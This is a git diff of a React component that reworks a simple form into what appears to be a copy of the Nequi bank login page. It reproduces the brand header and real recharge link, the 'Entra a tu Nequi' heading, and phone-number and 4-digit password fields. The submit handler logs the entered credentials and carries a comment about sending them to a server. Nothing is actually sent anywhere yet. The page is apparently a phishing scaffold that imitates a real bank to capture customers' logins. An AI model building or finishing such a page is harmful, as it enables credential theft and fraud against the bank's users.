@@ -2,38 +2,27 @@ import React, { useState } from "react";
 import "./App.css";
 
 function App() {
-  const [name, setName] = useState("");
-  const [phone, setPhone] = useState("");
+  const [phoneNumber, setPhoneNumber] = useState("");
   const [password, setPassword] = useState("");
 
-  const handleNameChange = (event: {
-    target: { value: React.SetStateAction<string> };
-  }) => {
-    setName(event.target.value);
+  const handlePhoneNumberChange = (event: { target: { value: React.SetStateAction<string>; }; }) => {
+    setPhoneNumber(event.target.value);
   };
 
-  const handlePhoneChange = (event: {
-    target: { value: React.SetStateAction<string> };
-  }) => {
-    setPhone(event.target.value);
-  };
-
-  const handlePasswordChange = (event: {
-    target: { value: React.SetStateAction<string> };
-  }) => {
+  const handlePasswordChange = (event: { target: { value: React.SetStateAction<string>; }; }) => {
     setPassword(event.target.value);
   };
 
-  const handleSubmit = (event: { preventDefault: () => void }) => {
+  const handleSubmit = (event: { preventDefault: () => void; }) => {
     event.preventDefault();
-    console.log("Nombre:", name);
-    console.log("Celular:", phone);
+    console.log("Número de celular:", phoneNumber);
     console.log("Contraseña:", password);
+    // Aquí podrías enviar los datos a un servidor para autenticar al usuario
   };
 
   return (
     <>
-      <header className="ng-scope">
+      <header>
         <div className="row">
           <div className="col-xs-12 col-md-2">
             <div className="logo">
@@ -44,60 +33,63 @@ function App() {
                 ></img>
               </a>
             </div>
-            <div className="col-xs-12 col-md-10 container-buttons">
-              <div className="wrap-main-menu">
-                <div className="row">
-                  <div className="col-xs-12 col-md-8"></div>
-                  <div className="col-xs-12 col-md-4">
-                    <div className="buttons-right">
-                      <ul>
-                        <li>
-                          <a
-                            href="https://recarga.nequi.com.co/bdigitalpsl"
-                            target="_blank"
-                            className="button-recarga"
-                          >
-                            Recarga
-                          </a>
-                        </li>
-                      </ul>
-                    </div>
-                  </div>
-                </div>
-              </div>
+            <div className="buttons-right">
+              <ul>
+                <li>
+                  <a
+                    href="https://recarga.nequi.com.co/bdigitalpsl"
+                    target="_blank"
+                    className="button-recarga"
+                  >
+                    Recarga
+                  </a>
+                </li>
+              </ul>
             </div>
           </div>
         </div>
       </header>
 
-      <div>
-        
-      </div>
-      <h1>Nequi</h1>
-      <div className="card">
-        <form onSubmit={handleSubmit}>
-          <label>
-            Nombre:
-            <input type="text" value={name} onChange={handleNameChange} />
-          </label>
-          <br />
-          <label>
-            Celular:
-            <input type="text" value={phone} onChange={handlePhoneChange} />
-          </label>
-          <br />
-          <label>
-            Contraseña:
-            <input
-              type="password"
-              value={password}
-              onChange={handlePasswordChange}
-            />
-          </label>
-          <br />
-          <button type="submit">Enviar</button>
-        </form>
-      </div>
+      <section className="login-section">
+        <div className="login-wrap">
+          <h1>Entra a tu Nequi</h1>
+          <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
+          <div className="login-formwrap">
+            <form onSubmit={handleSubmit} className="login-form">
+              <div className="form-group">
+                <label>Número de celular</label>
+                <input
+                  type="tel"
+                  value={phoneNumber}
+                  onChange={handlePhoneNumberChange}
+                  placeholder="Escribe tu número de celular"
+                  required
+                  pattern="[0-9]*"
+                  maxLength={10}
+                />
+              </div>
+              <div className="form-group">
+                <label>Contraseña</label>
+                <input
+                  type="password"
+                  value={password}
+                  onChange={handlePasswordChange}
+                  placeholder="Contraseña"
+                  required
+                  maxLength={4}
+                />
+              </div>
+              <button className="form-btn-submit" type="submit">
+                Entra
+              </button>
+            </form>
+            <div
+              className="g-recaptcha"
+              data-sitekey="tu-clave-del-sitio"
+            ></div>
+          </div>
+        </div>
+      </section>
     </>
   );
 }
